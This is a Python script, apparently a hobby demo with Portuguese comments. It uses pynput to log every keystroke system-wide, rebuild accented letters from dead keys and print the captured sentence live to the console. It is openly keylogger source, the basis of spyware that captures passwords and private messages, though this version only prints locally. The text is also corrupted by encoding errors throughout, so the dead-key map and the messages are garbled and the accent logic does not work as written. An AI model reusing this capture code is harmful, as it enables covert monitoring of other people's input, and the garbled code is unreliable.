from pynput import keyboard

class KeyLogger:
    def __init__(self):
        self.current_sentence = ""
        self.dead_key = None
        self.dead_key_map = {
            ("Â´", "a"): "Ã¡", ("Â´", "e"): "Ã©", ("Â´", "i"): "Ã­", ("Â´", "o"): "Ã³", ("Â´", "u"): "Ãº", ("Â´", "y"): "Ã½",
            ("`", "a"): "Ã ", ("`", "e"): "Ã¨", ("`", "i"): "Ã¬", ("`", "o"): "Ã²", ("`", "u"): "Ã¹",
            ("~", "a"): "Ã£", ("~", "o"): "Ãµ", ("~", "n"): "Ã±",
            ("^", "a"): "Ã¢", ("^", "e"): "Ãª", ("^", "i"): "Ã®", ("^", "o"): "Ã´", ("^", "u"): "Ã»",
            ("Â¨", "u"): "Ã¼", ("Â¨", "i"): "Ã¯", ("Â¨", "e"): "Ã«", ("Â¨", "a"): "Ã¤", ("Â¨", "o"): "Ã¶",
            ("'", "c"): "Ã§",
        }

    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                char = key.char

                # Verifica se Ã© uma tecla morta (dead key)
                if char in ['Â´', '`', '~', '^', 'Â¨', "'"]:
                    self.dead_key = char
                else:
                    if self.dead_key:
                        combo = self.dead_key_map.get((self.dead_key, char.lower()))
                        if combo:
                            self.current_sentence += combo
                        else:
                            # Se nÃ£o existir no mapa, adiciona os dois
                            self.current_sentence += self.dead_key + char
                        self.dead_key = None
                    else:
                        self.current_sentence += char

                print("\rFrase atual: " + self.current_sentence + " ", end="", flush=True)

            elif key == keyboard.Key.space:
                self.current_sentence += " "
                print("\rFrase atual: " + self.current_sentence + " ", end="", flush=True)

            elif key == keyboard.Key.backspace:
                self.current_sentence = self.current_sentence[:-1]
                print("\rFrase atual: " + self.current_sentence + " ", end="", flush=True)

            elif key == keyboard.Key.enter:
                print(f"\nFrase registrada: {self.current_sentence}")
                self.current_sentence = ""

            elif key == keyboard.Key.esc:
                print("\nEncerrando...")
                return False

        except Exception as e:
            print(f"\n[ERRO] {e}")

    def start(self):
        print("ðŸŸ¢ Keylogger rodando em segundo plano. Pressione ESC para sair.")
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == "__main__":
    logger = KeyLogger()
    logger.start()
